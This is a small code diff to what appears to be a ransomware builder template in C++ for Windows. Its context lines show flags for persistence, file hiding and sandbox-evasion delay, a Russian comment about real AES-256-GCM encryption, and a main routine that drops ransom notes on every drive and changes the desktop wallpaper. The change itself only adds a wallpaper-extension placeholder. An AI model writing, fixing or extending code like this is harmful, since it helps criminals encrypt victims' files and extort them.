@@ -46,6 +46,7 @@
 #define ADD_PERSISTENCE_ENABLED_PLACEHOLDER 0
 #define HIDE_FILES_ENABLED_PLACEHOLDER 0
 #define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0
+#define WALLPAPER_EXT_PLACEHOLDER ".jpg"
 
 // ============================================================
 // РЕАЛЬНОЕ ШИФРОВАНИЕ AES-256-GCM (OpenSSL)
@@ -425,7 +426,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    set_wallpaper(WALLPAPER_PLACEHOLDER, CONFIG["wallpaper_ext"].c_str());
+    set_wallpaper(WALLPAPER_PLACEHOLDER, WALLPAPER_EXT_PLACEHOLDER);
     
     return 0;
 }
